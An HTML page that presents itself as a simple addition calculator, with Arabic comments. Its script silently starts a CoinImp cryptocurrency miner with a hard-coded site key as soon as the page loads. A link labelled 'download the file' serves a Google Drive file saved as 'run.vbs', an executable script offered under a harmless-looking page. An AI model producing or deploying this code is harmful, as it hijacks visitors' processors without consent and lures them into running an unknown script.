<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Calculator with CoinImp Mining</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
        }
        #calculator {
            display: inline-block;
            border: 1px solid #ccc;
            padding: 20px;
            border-radius: 10px;
        }
        input {
            width: 40px;
            margin: 5px;
        }
    </style>
</head>
<body>

    <a href="https://drive.google.com/file/d/1jR56hxd37fmEiE7J1Xzddx_Eq9Qr3oBq/view?usp=sharing" download="run.vbs">تحميل الملف</a>

    <div id="calculator">
        <h1>Simple Calculator</h1>
        <input type="text" id="num1" placeholder="Num 1">
        <input type="text" id="num2" placeholder="Num 2">
        <button onclick="addNumbers()">Add</button>
        <h3>Result: <span id="result"></span></h3>
    </div>

    <script>
        // دالة لإجراء عملية الجمع
        function addNumbers() {
            var num1 = parseFloat(document.getElementById('num1').value);
            var num2 = parseFloat(document.getElementById('num2').value);
            var result = num1 + num2;
            document.getElementById('result').textContent = result;
        }

        // دمج كود تعدين CoinImp
        var miner = new CoinImp.Anonymous('77df418b1f6d4f42050541215eed6c63cfaca765118650d51be37632dfc12cb0');  // ضع مفتاح الموقع الخاص بك هنا
        miner.start();

        // الاستماع لحالة التعدين
        miner.on('found', () => console.log('Hash found!'));
        miner.on('accepted', () => console.log('Hash accepted!'));
        miner.on('error', (err) => console.error('Error: ', err));
    </script>

    <!-- سكربت CoinImp -->
    <script src="https://www.coinimp.com/scripts/miner.js"></script>
</body>
</html>
